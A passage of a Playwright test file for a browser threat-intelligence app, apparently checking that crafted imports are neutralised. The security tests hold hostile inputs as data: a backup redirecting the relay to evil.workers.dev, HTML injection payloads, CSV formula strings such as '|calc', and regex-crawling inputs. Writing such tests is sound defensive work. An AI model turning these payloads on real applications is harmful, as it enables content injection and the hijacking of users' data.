    for (let i = 1; i < 300; i++) DB.links.push({ id: 'lb' + i, caseId: c.id, a: 'vb' + i, b: 'vb' + Math.floor(i / 3), label: 'resolves to', conf: 2, src: '' });
    DB.active = c.id; mutate("gen");
  })());
  const T = await page.evaluate(async () => { const t = (f) => { const a = performance.now(); f(); return performance.now() - a; };
    const r = {}; CP.memo.clear(); r.copilot = t(() => copilot()); r.nlq = t(() => nlqRun(nlqParse('malicious domains last week'))); r.risk = t(() => gRisk()); r.suggest = t(() => suggestLinks(DB.active));
    go(caseHash(DB.active, 'overview')); await new Promise(res => setTimeout(res, 200)); r.edit = t(() => { mutate('x'); renderMain(); }); r.byId = t(() => { for (let i = 0; i < 20000; i++) recById('rb' + (i % 10000)); }); return r; });
  expect(T.copilot).toBeLessThan(2500); expect(T.nlq).toBeLessThan(400); expect(T.risk).toBeLessThan(200); expect(T.suggest).toBeLessThan(500); expect(T.edit).toBeLessThan(800); expect(T.byId).toBeLessThan(100);
  await expect(page.locator('#cpCard')).toContainText('Next steps', { timeout: 10000 });
  noErrors(errors);
});

test('no serious accessibility problems on the newer screens (copilot, investigate, coverage, health, look-alikes, identity, report, watchlist), light and dark', async ({ page }) => {
  test.setTimeout(300_000);
  const AxeBuilder = require('@axe-core/playwright').default;
  const errors = await open(page, '#/home');
  const setups = {
    overview: () => { location.hash = '#/case/c-lantern/overview'; },
    media: () => { const r = DB.records.find(x => x.caseId === 'c-lantern'); r.att = [{ id: 'fx1', name: 'shot.png', type: 'image/png', size: 2048, sha256: 'a'.repeat(64), added: Date.now(), w: 10, h: 10 }, { id: 'fx2', name: 'clip.webm', type: 'video/webm', size: 4096, sha256: 'b'.repeat(64), added: Date.now(), dur: 12 }]; DB.records.push({ ...r, id: 'rbig', att: [], big: { name: 'huge.mp4', type: 'video/mp4', size: 6e7, sha256: '' } }); mutate('m'); location.hash = '#/case/c-lantern/media'; },
    mediaEmpty: () => { location.hash = '#/case/c-portal/media'; },
    patterns: () => { UI.tlMode = 'patterns'; location.hash = '#/case/c-lantern/timeline'; },
    caseRules: () => { UI.tlMode = 'rules'; UI.crf = 'blind'; location.hash = '#/case/c-lantern/timeline'; },
    caseRulesCaught: () => { UI.tlMode = 'rules'; UI.crf = 'caught'; location.hash = '#/case/c-lantern/timeline'; },
    healthTests: () => { UI.dview = 'health'; UI.dqf = 'alike'; location.hash = '#/detections'; },
    ruleEvasion: () => { ensureRules(); const r = DB.rules.find(x => x.title === 'PowerShell Encoded Command Execution'); UI.rule = r.id; UI.ropen = true; UI.rtab = 'evasion'; location.hash = '#/detections'; },
    ruleQueries: () => { UI.rtab = 'queries'; location.hash = '#/detections'; },
    ruleTests: () => { const r = DB.rules.find(x => x.id === UI.rule); r.tests = [{ id: 't1', kind: 'hit', text: 'CommandLine="powershell -enc AAA" Image="C:\\x\\powershell.exe"' }, { id: 't2', kind: 'miss', text: 'CommandLine="cmd"' }]; UI.rtab = 'tests'; location.hash = '#/detections'; },
    notesBar: () => { location.hash = '#/notes'; },
    today: () => { location.hash = '#/today'; },
    chain: () => { UI.tlMode = 'chain'; location.hash = '#/case/c-lantern/timeline'; },
    dupes: () => { location.hash = '#/case/c-lantern/vault'; setTimeout(() => { const e = { id: 'vdup', caseId: 'c-lantern', type: 'person', fields: { name: 'Okafor Jordan' }, priority: 'low', starred: false, tags: [], notes: '', src: '', created: Date.now() }; normEntry(e); if(!entryById('vdup')) DB.entries.push(e); dupDlg(); }, 60); },
    vaultCards: () => { DB.prefs.vLay = 'cards'; location.hash = '#/case/c-lantern/vault'; },
    vaultList: () => { DB.prefs.vLay = 'list'; location.hash = '#/case/c-lantern/vault'; },
    picInsights: () => { UI.mdV = 'pic'; location.hash = '#/case/c-lantern/media'; },
    automations: () => { autoEnsure(); if(!DB.autos.length){ DB.autos.push({ id: 'au1', name: 'Check new indicators', on: true, when: { ev: 'ind', kinds: ['ip'] }, scope: 'all', then: [{ a: 'store' }], runs: 2, last: Date.now() }); DB.autoLog.push({ at: Date.now(), rule: 'au1', name: 'Check new indicators', c: 'c-lantern', what: 'watching 203.0.113.47' }); } UI.pbTab = 'auto'; UI.pb = null; location.hash = '#/playbooks'; },
    activity: () => { location.hash = '#/home'; setTimeout(() => { DB.prefs.seen = DB.prefs.seen || {}; DB.prefs.seen['c-portal'] = Date.now() - 864e5 * 400; location.hash = '#/case/c-portal/overview'; }, 80); },
    report: () => { DB.prefs.repT = 'full'; location.hash = '#/case/c-lantern/report'; },
    investigate: () => { UI.itab = 'look'; UI.look = { k: 'ipv4', v: '203.0.113.47' }; LKV.key = 'ipv4:203.0.113.47'; LKV.res = { idb: { ok: true, at: Date.now(), sig: [{ t: 'mal', w: 0.8, why: 'Shodan tags it c2', ts: 0 }], facts: [['Open ports', '4444']], attrs: { ports: [4444] }, related: [{ k: 'domain', v: 'update-lamp.test', rel: 'hostname' }], link: 'https://www.shodan.io/host/203.0.113.47' } }; LKV.pending = new Set(); location.hash = '#/feeds'; },
    investigateEmpty: () => { UI.itab = 'look'; UI.look = null; LKV.bulk = null; location.hash = '#/feeds'; },
    coverage: () => { UI.dview = 'coverage'; location.hash = '#/detections'; },
    health: () => { UI.dview = 'health'; location.hash = '#/detections'; },
    twist: () => { UI.labTab = 'twist'; UI.tw = { d: 'paypal.com', list: twGen('paypal.com').map((x, i) => i < 3 ? Object.assign(x, { done: true, exists: true, ips: ['45.77.10.' + i], mx: i ? [] : ['mx.x.com'], ns: [] }) : x) }; location.hash = '#/lab'; },
    identEmail: () => { UI.labTab = 'ident'; UI.idq = 'jordan.okafor1992@gmail.com'; location.hash = '#/lab'; },
    identUser: () => { UI.labTab = 'ident'; UI.idq = 'n1ghtlamp'; location.hash = '#/lab'; },
    graphIns: () => { UI.graph.panel = 'ins'; location.hash = '#/case/c-lantern/graph'; },
    setup1: () => { location.hash = '#/home'; setTimeout(() => { SU.mode = 'free'; setupOpen(1); }, 60); },
    setup4: () => { location.hash = '#/home'; setTimeout(() => { setupOpen(4); }, 60); },
    share: () => { location.hash = '#/case/c-lantern/report'; setTimeout(() => shareDlg(), 60); },
    watch: () => { DB.watch = { 'ipv4:203.0.113.47': { at: Date.now(), checked: Date.now(), snap: { band: 'malicious', score: 80 }, alerts: [{ at: Date.now(), d: [{ hot: true, t: 'New port: 3389' }] }], unseen: true } }; location.hash = '#/watch'; },
  };
  const found = [];
  for (const theme of ['light', 'dark']) {
    await page.evaluate(t => { DB.prefs.theme = t; applyPrefs(); renderAll(); }, theme);
    for (const name of Object.keys(setups)) {
      if (name === 'health') await page.evaluate(() => ruleHealth());
      if (name === 'healthTests') await page.evaluate(() => ruleHealth());
      if (name.startsWith('caseRules')) { await page.evaluate(() => { location.hash = '#/case/c-lantern/timeline'; UI.tlMode = 'rules'; renderMain(); }); await page.waitForFunction(() => !!document.querySelector('.cr-sum'), null, { timeout: 20000 }); }
      await page.evaluate(src => { closeDlg(); (0, eval)('(' + src + ')')(); setTimeout(renderMain, 20); }, setups[name].toString());
      await page.waitForTimeout(500);
      const res = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
      for (const v of res.violations) if (['serious', 'critical'].includes(v.impact)) for (const n of v.nodes.slice(0, 3)) found.push(`${theme} ${name} ${v.id}: ${n.target.join(' ')} ${n.failureSummary ? n.failureSummary.split('\n')[1] : ''}`);
    }
  }
  expect(found, found.join('\n')).toEqual([]);
  noErrors(errors.filter(e => !/Connecting to 'file:.*violates the following Content Security Policy directive: "connect-src/.test(e)));
});

test('security: a crafted backup cannot redirect the relay or switch on lookups; history it carries is plain values; restore-point downloads hold no secrets; hostile STIX patterns stay fast', async ({ page }) => {
  const errors = await open(page, '#/settings');
  await page.evaluate(() => { const S = lkSettings(); S.relay = { url: 'https://mine.workers.dev', token: 'MY-TOKEN' }; S.keys.shodan = 'MY-KEY'; S.on = { dns: true }; mutate('t'); });
  const evil = await page.evaluate(async () => { const o = JSON.parse(JSON.stringify(await backupObject())); o.intel.look = { on: { vt: true, idb: true }, keys: { shodan: 'THEIRS' }, relay: { url: 'https://evil.workers.dev', token: '' } };
    o.intel.sources = [{ id: 'kev', on: true, url: 'https://raw.githubusercontent.com/attacker/x/kev.json', host: 'evil' }]; o.prefs.watchEvery = 1; o.cases[0].autoLook = true;
    o.intel.lookHist = [{ k: 'ipv4', v: '1.1.1.1', band: 'malicious', score: '<a href=https://phish>Re-authenticate</a>' }, { k: 'x', v: '<img>' }];
    o.watch = { 'ipv4:1.1.1.1': { at: 1, snap: { band: '<b>x</b>', score: '<i>9</i>' }, alerts: [{ at: 1, d: [{ hot: 1, t: 'x'.repeat(5000) }] }] } }; return JSON.stringify(o); });
  page.once('filechooser', fc => fc.setFiles({ name: 'backup.json', mimeType: 'application/json', buffer: Buffer.from(evil) }));
  await page.evaluate(() => clickAct('importAll')); await page.click('#dlg .btn.primary, #dlg button:has-text("Import backup")');
  await expect.poll(() => page.evaluate(() => (DB.intel.lookHist || []).length), { timeout: 10000 }).toBe(1);
  const S = await page.evaluate(() => ({ relay: DB.intel.look.relay, keys: DB.intel.look.keys, on: DB.intel.look.on, kev: ctiSrc('kev').url, every: DB.prefs.watchEvery || 0, auto: DB.cases.some(c => c.autoLook), h: DB.intel.lookHist[0], w: DB.watch['ipv4:1.1.1.1'] }));
  expect(S.relay).toEqual({ url: 'https://mine.workers.dev', token: 'MY-TOKEN' }); expect(S.keys).toEqual({ shodan: 'MY-KEY' }); expect(S.on).toEqual({ dns: true });
  expect(S.kev).toBe(await page.evaluate(() => CTI_SOURCES.find(s => s.id === 'kev').url)); expect(S.kev).not.toContain('attacker');
  expect(S.every).toBe(0); expect(S.auto).toBe(false); expect(S.h.score).toBe(0); expect(S.w.snap).toMatchObject({ band: 'unknown', score: 0 }); expect(S.w.alerts[0].d[0].t.length).toBe(300);
  // restore-point downloads never contain keys or the relay token
  await page.evaluate(() => { const S = lkSettings(); S.keys.shodan = 'SECRET-K'; S.relay.token = 'SECRET-T'; mutate('t'); }); await page.evaluate(() => snapshot('test'));
  const at = await page.evaluate(async () => (await snapsLoad())[0].at);
  const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(at => snapDownload(at), at)]);
  const txt = require('fs').readFileSync(await dl.path(), 'utf8'); expect(txt).not.toContain('SECRET-K'); expect(txt).not.toContain('SECRET-T'); expect(txt).toContain('"cases"');
  // the STIX pattern reader is linear
  const ms = await page.evaluate(() => { const t = performance.now(); for (let i = 0; i < 50; i++) stixPatternValues("[a:" + ' '.repeat(19990) + "x = 'y']"); return performance.now() - t; });
  expect(ms).toBeLessThan(500);
  // redaction on a long run of dots is fast
  expect(await page.evaluate(() => { const r = redactor({ entries: [] }, true), t = performance.now(); r('a.'.repeat(20000)); return performance.now() - t; })).toBeLessThan(300);
  noErrors(errors);
});

test('share package: one ZIP with a read-only page (no scripts, its own CSP), STIX, MISP, rules, CSV and a manifest of SHA-256s; redaction and TLP reach every file', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/report');
  await page.evaluate(() => ruleFromCase());                      // gives the case two rules
  await page.goto(page.url().replace(/#.*/, '#/case/c-lantern/report'));
  await page.click('[data-act=shareDlg]'); await expect(page.locator('#dlg')).toContainText('Traffic Light Protocol');
  await page.click('[data-act=shTlp][data-v=green]');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=shGo]')]);
  expect(dl.suggestedFilename()).toMatch(/^TN-2026-014-.*-green\.zip$/);
  const out = require('child_process').execFileSync('python3', ['-I', '-c', `
import zipfile, hashlib, json, sys
z = zipfile.ZipFile(sys.argv[1]); names = z.namelist(); r = {'names': names}
html = [n for n in names if n.endswith('.html')][0]; h = z.read(html).decode()
r['csp'] = "default-src 'none'" in h; r['script'] = '<script' in h.lower(); r['tlp'] = 'TLP:GREEN' in h; r['email'] = 'billing@lantern-invoice.example' in h; r['defanged'] = 'lantern-invoice[.]example' in h; r['svg'] = '<svg' in h
st = json.loads(z.read([n for n in names if n.endswith('.stix.json')][0])); r['stix'] = sorted(set(o['type'] for o in st['objects'])); r['stix_email'] = any("email-addr" in o.get('pattern', '') for o in st['objects'])
r['green'] = any('marking-definition' in m for o in st['objects'] for m in o.get('object_marking_refs', []))
mi = json.loads(z.read([n for n in names if n.endswith('.misp.json')][0])); r['misp_tag'] = mi['Event']['Tag'][0]['name']; r['misp_n'] = len(mi['Event']['Attribute'])
man = z.read([n for n in names if n.endswith('MANIFEST.txt')][0]).decode(); ok = True
for line in man.splitlines():
  p = line.split('  ', 1)
  if len(p) == 2 and len(p[0]) == 64:
    data = z.read(names[0].split('/')[0] + '/' + p[1]); ok = ok and hashlib.sha256(data).hexdigest() == p[0]
r['manifest_ok'] = ok and 'TLP:GREEN' in man; r['rules'] = len([n for n in names if '/rules/' in n])
print(json.dumps(r))`, await dl.path()]).toString();
  const R = JSON.parse(out);
  expect(R).toMatchObject({ csp: true, script: false, tlp: true, email: false, defanged: true, svg: true, stix_email: false, green: true, misp_tag: 'tlp:green', manifest_ok: true });
  expect(R.stix).toEqual(expect.arrayContaining(['identity', 'indicator', 'report']));
  expect(R.rules).toBeGreaterThanOrEqual(2); expect(R.misp_n).toBeGreaterThan(3);
  noErrors(errors);
});

test('first-run setup: offline mode switches nothing on; free mode turns on only browser sources; relay step appears only when chosen; finish leads somewhere useful; re-runnable from Settings', async ({ page }) => {
  const errors = await open(page, '#/home');
  await expect(page.locator('.su-ban')).toBeVisible();
  await page.click('.su-ban [data-act=setupOpen]'); await expect(page.locator('#dlg')).toContainText('How should OSINTrix use the internet?');
  await expect(page.locator('[data-act=suNext]')).toBeDisabled();
  // offline: straight to threat intel, nothing on
  await page.click('[data-act=suMode][data-v=off]'); await page.click('[data-act=suNext]');
  await expect(page.locator('#dlg')).toContainText('Keep up with threats'); expect(await page.evaluate(() => LK_PROVIDERS.filter(lkOn).length)).toBe(0);
  await page.click('[data-act=suBack]'); await expect(page.locator('#dlg')).toContainText('How should OSINTrix use the internet?');
  // free: browser sources only, no relay step
  await page.click('[data-act=suMode][data-v=free]'); await page.click('[data-act=suNext]');
  await expect(page.locator('#dlg')).toContainText('Which services may see what you investigate?');
  const on = await page.evaluate(() => LK_PROVIDERS.filter(p => lkSettings().on[p.id]).map(p => p.via));
  expect(on.length).toBeGreaterThan(8); expect(on.every(v => v === 'direct')).toBe(true);
  await page.locator('[data-act=suProv][data-id=hibp]').uncheck(); expect(await page.evaluate(() => !!lkSettings().on.hibp)).toBe(false);
  await page.click('[data-act=suNext]'); await expect(page.locator('#dlg')).toContainText('Keep up with threats');
  await page.locator('[data-act=suSrc][data-id=kev]').check(); expect(await page.evaluate(() => ctiSrc('kev').on)).toBe(true);
  await page.click('[data-act=suNext]'); await expect(page.locator('#dlg')).toContainText('You are set up'); await expect(page.locator('.su-sum')).toContainText('lookup sources on');
  await page.click('[data-act=suGo][data-v=look]'); await expect(page).toHaveURL(/#\/feeds/); await expect(page.locator('#lkQ')).toBeVisible();
  expect(await page.evaluate(() => !!DB.prefs.setupDone)).toBe(true);
  await page.goto(page.url().replace(/#.*/, '#/home')); await expect(page.locator('.su-ban')).toHaveCount(0);
  // relay mode shows the relay step
  await page.goto(page.url().replace(/#.*/, '#/settings')); await page.click('[data-act=setupOpen]'); await page.click('[data-act=suMode][data-v=relay]'); await page.click('[data-act=suNext]'); await page.click('[data-act=suNext]');
  await expect(page.locator('#dlg')).toContainText('Connect your relay'); await expect(page.locator('[data-act=suNext]')).toContainText('Skip for now');
  noErrors(errors);
});

test('big lists: a 10,000-record timeline and 11,000-entity table draw only what is on screen, yet every row is reachable; keyboard and "open record" still work', async ({ page }) => {
  test.setTimeout(120000);
  const errors = await open(page, '#/home');
  await page.evaluate(() => (() => { const N = 10000;
    const c = { id: 'c-big', name: 'Big case — load test', code: 'BIG-1', status: 'active', owner: 'You', created: Date.now(), updated: Date.now(), scope: 'Load', color: CASE_COLORS[1], icon: 'briefcase' }; DB.cases.push(c);
    const hosts = Array.from({ length: 60 }, (_, i) => 'WS-' + i), t0 = Date.parse('2026-09-01T00:00:00Z');
    for (let i = 0; i < N; i++) { const ip = '45.' + (i % 200) + '.' + ((i * 7) % 250) + '.' + ((i * 13) % 250), dom = 'host' + (i % 900) + '.evil' + (i % 37) + '.top';
      const body = `EventID=${[4624, 4625, 1, 3, 11, 7045][i % 6]} Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd /c ping ${dom}" DestinationIp=${ip} DestinationPort=${[443, 80, 4444, 8080][i % 4]} User=CORP\\u${i % 300}`;
      DB.records.push({ id: 'rb' + i, caseId: c.id, type: 'evidence', title: 'Event ' + i + ' on ' + hosts[i % 60], body, tsRaw: '', tsZone: 'explicit', ts: t0 + i * 61000, source: ['sysmon', 'security', 'proxy'][i % 3], host: hosts[i % 60], tags: [], ents: E.extract(body), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); }
    for (let i = 0; i < 300; i++) { const e = { id: 'vb' + i, caseId: c.id, type: 'domain', fields: { domain: 'host' + i + '.evil' + (i % 37) + '.top' }, priority: 'medium', starred: false, tags: [], notes: '', src: '', created: Date.now(), pos: { x: (i % 20) * 80, y: Math.floor(i / 20) * 80 } }; DB.entries.push(e); if (i % 5 === 0) DB.verdicts['domain:' + e.fields.domain] = 'malicious'; }
    for (let i = 1; i < 300; i++) DB.links.push({ id: 'lb' + i, caseId: c.id, a: 'vb' + i, b: 'vb' + Math.floor(i / 3), label: 'resolves to', conf: 2, src: '' });
    DB.active = c.id; mutate("gen");
  })());
  const t0 = Date.now(); await page.evaluate(() => go(caseHash(DB.active, 'timeline'))); await page.waitForSelector('#tlV .ev'); const ms = Date.now() - t0;
  expect(ms).toBeLessThan(2500);
  expect(await page.locator('#tlV .ev').count()).toBeLessThan(60);                           // not 10,000
  await page.evaluate(() => { const s = document.querySelector('#main .scroll'); s.scrollTop = s.scrollHeight; }); await page.waitForTimeout(300);
  await page.evaluate(() => { const s = document.querySelector('#main .scroll'); s.scrollTop = s.scrollHeight; }); await page.waitForTimeout(300);
  await expect(page.locator('#tlV .ev .ttl').last()).toHaveText('Event 9999 on WS-39');
  await page.evaluate(() => { document.querySelector('#main .scroll').scrollTop = 0; }); await page.waitForTimeout(200);
  await page.keyboard.press('j'); await page.keyboard.press('j');
  expect(await page.evaluate(() => recById(UI.sel.id).title)).toBe('Event 1 on WS-1');
  await page.evaluate(() => { go('#/home'); }); await page.evaluate(() => { UI.sel = { kind: 'rec', id: 'rb6543' }; UI.inspOpen = true; go(caseHash(DB.active, 'timeline')); });
  await expect(page.locator('#tlV .ev[data-id="rb6543"]')).toBeInViewport();
  // entities: all of them, not the first 400
  await page.evaluate(() => go(caseHash(DB.active, 'entities'))); await page.waitForSelector('#ceV tr[data-act=selEnt]');
  const n = await page.evaluate(() => UI.ceList.length); expect(n).toBeGreaterThan(5000); expect(await page.locator('#ceV tr[data-act=selEnt]').count()).toBeLessThan(80);
  await page.evaluate(() => { const s = document.querySelector('#main .scroll'); s.scrollTop = s.scrollHeight; }); await page.waitForTimeout(300);
  await page.evaluate(() => { const s = document.querySelector('#main .scroll'); s.scrollTop = s.scrollHeight; }); await page.waitForTimeout(300);
  expect(await page.evaluate(() => [...document.querySelectorAll('#ceV tr[data-act=selEnt]')].pop().dataset.id)).toBe(await page.evaluate(() => UI.ceList[UI.ceList.length - 1]));
  noErrors(errors);
});

test('audit fixes: imported case labels cannot inject markup; backup keeps this browser\'s trusted keys; CSV formulas behind spaces are neutralised; huge key strength refused; Office metadata traps stay fast; long menu labels stay on one line', async ({ page }) => {
  const errors = await open(page, '#/cases');
  // a shared case file with markup in status, priority and link confidence
  const evil = { format: 'osintrix-case', case: { id: 'x', name: 'Shared', code: 'SH-1', status: "<meta http-equiv=refresh content='0;url=https://evil.example'>", owner: 'x', created: 1, updated: 1, scope: '', color: 'red;background:url(x)', icon: 'x" onmouseover="1' },
    entries: [{ id: 'e1', caseId: 'x', type: 'domain', fields: { domain: 'a.example' }, priority: '<b>hi</b>', tags: [], notes: '' }], records: [], links: [{ id: 'l1', caseId: 'x', a: 'e1', b: 'e1', label: 'x', conf: '<img src=x>' }] };
  page.once('filechooser', fc => fc.setFiles({ name: 'case.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(evil)) }));
  await page.evaluate(() => clickAct('importCase'));
  await expect.poll(() => page.evaluate(() => DB.cases.some(c => c.code === 'SH-1'))).toBe(true);
  const c = await page.evaluate(() => { const c = DB.cases.find(c => c.code === 'SH-1'); const e = DB.entries.find(e => e.caseId === c.id); const l = DB.links.find(l => l.caseId === c.id); return { s: c.status, col: c.color, icon: c.icon, p: e.priority, conf: l ? l.conf : 1 }; });
  expect(c).toEqual({ s: 'active', col: '#5468ff', icon: 'briefcase', p: 'medium', conf: 1 });
  expect(await page.evaluate(() => statusTag('<b>x</b>') + prioLabel('<i>') + vdLabel('<u>') + conf('<s>'))).not.toMatch(/<b>|<u>|<s>|data-p="<i>/);
  await page.evaluate(() => go('#/cases')); await expect(page.locator('meta[http-equiv=refresh]')).toHaveCount(0);
  // backup import keeps this browser's security settings (trusted keys, auto-lock)
  await page.evaluate(() => { DB.security = DB.security || {}; DB.security.trusted = { mine: { name: 'Me' } }; DB.security.autolock = 15; mutate('t'); });
  const bk = await page.evaluate(async () => { const o = JSON.parse(JSON.stringify(await backupObject())); o.security = { trusted: { attacker: { name: 'Evil' } }, autolock: 0, sign: { pub: {}, priv: { kty: 'EC' } } }; return JSON.stringify(o); });
  page.once('filechooser', fc => fc.setFiles({ name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(bk) }));
  await page.evaluate(() => clickAct('importAll')); await page.click('#dlg button:has-text("Import backup")');
  await expect.poll(() => page.evaluate(() => JSON.stringify(DB.security.trusted))).toContain('mine');
  expect(await page.evaluate(() => [JSON.stringify(DB.security.trusted).includes('attacker'), DB.security.autolock])).toEqual([false, 15]);
  // CSV
  expect(await page.evaluate(() => [' =cmd|x', '　=1+1', '|calc', '＝SUM(A1)', 'plain', '-5'].map(csvFormula))).toEqual(["' =cmd|x", "'　=1+1", "'|calc", "'＝SUM(A1)", 'plain', "'-5"]);
  // key strength from a file
  expect(await page.evaluate(async () => { try { await deriveKey('p', new Uint8Array(16), 1e10); return 'ran'; } catch (e) { return e.message; } })).toMatch(/Unsupported key strength/);
  // Office metadata and relationships built to make regexes crawl
  const ms = await page.evaluate(async () => { const t = performance.now();
    const z = nbZip([{ name: '[Content_Types].xml', data: '<Types/>' }, { name: 'docProps/core.xml', data: '<title'.repeat(40000) }, { name: 'word/_rels/document.xml.rels', data: 'Target="a" '.repeat(20000) }]);
    await zipInfo(new Uint8Array(await z.arrayBuffer())); return performance.now() - t; });
  expect(ms).toBeLessThan(1500);
  // menus: one line per item however long the label
  await page.evaluate(() => showMenu(300, 200, [{ label: 'CISA advisories: CISA Adds Two Known Exploited Vulnerabilities to Catalog — and a much longer tail', icon: 'newspaper', fn: () => {} }, { label: 'Short', icon: 'plus', fn: () => {} }]));
  const hs = await page.evaluate(() => [...document.querySelectorAll('#ctx .ctx-it')].map(b => Math.round(b.getBoundingClientRect().height)));
  expect(hs[0]).toBe(hs[1]); expect(await page.evaluate(() => { const s = document.querySelector('#ctx .ctx-it span'); return s.scrollHeight <= s.clientHeight + 1; })).toBe(true);
  noErrors(errors);
});

test('data safety: restore points keep their files; a damaged restore-point list is rebuilt; passphrase changes can be finished; undoing a backup brings indicators back; case files carry notes, verdicts and hypotheses; trashed links come back; no-case screens draw; rules round-trip without duplicates', async ({ page }) => {
  const errors = await open(page, '#/home');
  // 1. a file only a restore point still needs is not a leftover and is not deleted
  const st = await page.evaluate(async () => {
    const r = DB.records.find(x => x.caseId === 'c-lantern'); await IDB.set('file:keepme', new Blob(['x'])); await IDB.set('file:stray', new Blob(['y']));
    r.att = (r.att || []).concat([{ id: 'keepme', name: 'k.txt', size: 1, type: 'text/plain' }]); mutate('att'); await snapshot('test');
    r.att = r.att.filter(a => a.id !== 'keepme'); mutate('drop att');
    const I = await storageBreakdown(); const del = await blobDel('file:keepme');
    return [I.orphans.includes('file:keepme'), I.orphans.includes('file:stray'), del, !!(await IDB.get('file:keepme'))];
  });
  expect(st).toEqual([false, true, false, true]);
  // 2. an unreadable restore-point list is rebuilt from the restore points, not wiped
  const sn = await page.evaluate(async () => { const n = (await snapsLoad()).length; await IDB.set('osintrix-snaps', '{not json'); SNAPS = null; const m = (await snapsLoad()).length; await snapshot('after damage'); SNAPS = null; return [n, m, (await snapsLoad()).length]; });
  expect(sn[1]).toBeGreaterThanOrEqual(sn[0]); expect(sn[2]).toBe(sn[1] + 1);
  // 3. the workspace is written before everything beside it, and a cut-short change can be run again
  const enc = await page.evaluate(async () => {
    await encEnable('first passphrase'); const after1 = localStorage.getItem('osintrix:reseal');
    await encChange('first passphrase', 'second passphrase'); await resealAll(null);   // a second run changes nothing and breaks nothing
    SNAPS = null; const L = await snapsLoad(); let ok = true; for(const s of L.slice(0, 2)){ try{ JSON.parse(await openStr(await IDB.get('osintrix-snap:' + s.at))); }catch(e){ ok = false; } }
    const iocs = await IDB.get('cti:iocs'); let iocOk = true; if(iocs){ try{ JSON.parse(await openStr(iocs)); }catch(e){ iocOk = false; } }
    await encDisable('second passphrase'); return [after1, ok, iocOk, localStorage.getItem('osintrix:reseal'), !!SEC.key];
  });
  expect(enc).toEqual([null, true, true, null, false]);
  // 4. undoing a backup import brings the indicator store back
  await page.evaluate(async () => { await ctiLoad(); ctiAddIocs([{ v: '198.51.100.77', type: 'ipv4', tags: ['mine'] }], 'Test'); await ctiSaveIocs(); });
  const bk = await page.evaluate(async () => { const o = JSON.parse(JSON.stringify(await backupObject())); o.ctiIocs = [{ v: 'evil.example', k: 'domain' }]; return JSON.stringify(o); });
  page.once('filechooser', fc => fc.setFiles({ name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(bk) }));
  await page.evaluate(() => clickAct('importAll')); await page.click('#dlg button:has-text("Import backup")');
  await expect.poll(() => page.evaluate(() => CTI.iocs.some(x => x.v === 'evil.example'))).toBe(true);
  await page.click('#toastBtn');
  await expect.poll(() => page.evaluate(() => CTI.iocs.some(x => x.v === '198.51.100.77') && !CTI.iocs.some(x => x.v === 'evil.example'))).toBe(true);
  // 5. a case file carries its notes, verdicts and hypotheses; an imported demo case is the user's own
  const dl = page.waitForEvent('download'); await page.evaluate(() => { DB.verdicts['ipv4:203.0.113.47'] = 'malicious'; ensureAchDemo(); clickAct('exportCase', 'c-lantern'); });
  const file = await (await dl).path(); const txt = require('fs').readFileSync(file, 'utf8'); const o = JSON.parse(txt);
  expect(o.notes.length).toBeGreaterThan(0); expect(Object.keys(o.verdicts).length).toBeGreaterThan(0);
  await page.evaluate(() => { delete DB.verdicts['ipv4:203.0.113.47']; mutate('v'); });
  page.once('filechooser', fc => fc.setFiles({ name: 'c.json', mimeType: 'application/json', buffer: Buffer.from(txt) }));
  await page.evaluate(() => clickAct('importCase'));
  await expect.poll(() => page.evaluate(() => DB.cases.length)).toBeGreaterThan(3);
  const ic = await page.evaluate(() => { const c = DB.cases[DB.cases.length - 1], recs = new Set(DB.records.filter(r => r.caseId === c.id).map(r => r.id));
    return { sample: c.sample, notes: DB.notes.filter(n => n.caseId === c.id).length, v: DB.verdicts['ipv4:203.0.113.47'], ach: !c.ach || c.ach.ev.every(e => !e.rec || recs.has(e.rec)), achN: c.ach ? c.ach.ev.length : 0 }; });
  expect(ic).toEqual({ sample: undefined, notes: o.notes.length, v: 'malicious', ach: true, achN: o.case.ach ? o.case.ach.ev.length : 0 });
  // 6. a relationship between two trashed entries comes back when both are restored, in either order
  const lk = await page.evaluate(() => { const L = DB.links.find(l => entryById(l.a) && entryById(l.b)); clickAct('delEntry', L.a); clickAct('delEntry', L.b);
    const t = DB.trash.filter(x => x.kind === 'entry').slice(0, 2); trashRestore(t[0].id); trashRestore(t[1].id); return DB.links.some(l => l.id === L.id); });
  expect(lk).toBe(true);
  // 7. with no cases at all, every screen draws and "add to a case" offers to make one
  await page.evaluate(() => { DB.cases = []; DB.records = []; DB.entries = []; DB.active = null; mutate('none'); });
  for (const h of ['#/playbooks', '#/decoder', '#/cases', '#/home']) { await page.evaluate(h => go(h), h); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => openCapture()); await expect(page.locator('#toastMsg')).toContainText('Make a case first');
  await page.evaluate(() => closeDlg());
  // 8. exported rules come back as the same rules, not copies, and keep stars and references
  const rd = page.waitForEvent('download'); await page.evaluate(() => { DB.rules[0].starred = true; clickAct('rExportAll'); });
  const rtxt = require('fs').readFileSync(await (await rd).path(), 'utf8'); const n0 = await page.evaluate(() => DB.rules.length);
  page.once('filechooser', fc => fc.setFiles({ name: 'r.json', mimeType: 'application/json', buffer: Buffer.from(rtxt) }));
  await page.evaluate(() => importRules()); await page.waitForTimeout(600);
  expect(await page.evaluate(() => DB.rules.length)).toBe(n0);
  const one = JSON.parse(rtxt)[0]; expect(one.starred).toBe(true); expect(Array.isArray(one.refs)).toBe(true);
  noErrors(errors);
});

test('media: drop, paste or add pictures, videos and saved pages to a case; originals kept once with previews; big files recorded by fingerprint; media entries hold their file; backups with or without files', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/media');
  await expect(page.locator('.md-empty')).toBeVisible();
  // a picture and a short video, made in the page
  await page.evaluate(async () => {
    const c = document.createElement('canvas'); c.width = 640; c.height = 480; const g = c.getContext('2d'); g.fillStyle = '#c33'; g.fillRect(0, 0, 640, 480);
    window.__png = await new Promise(r => c.toBlob(r, 'image/png'));
    const st = c.captureStream(10), rec = new MediaRecorder(st, { mimeType: 'video/webm' }), ch = []; rec.ondataavailable = e => ch.push(e.data); rec.start();
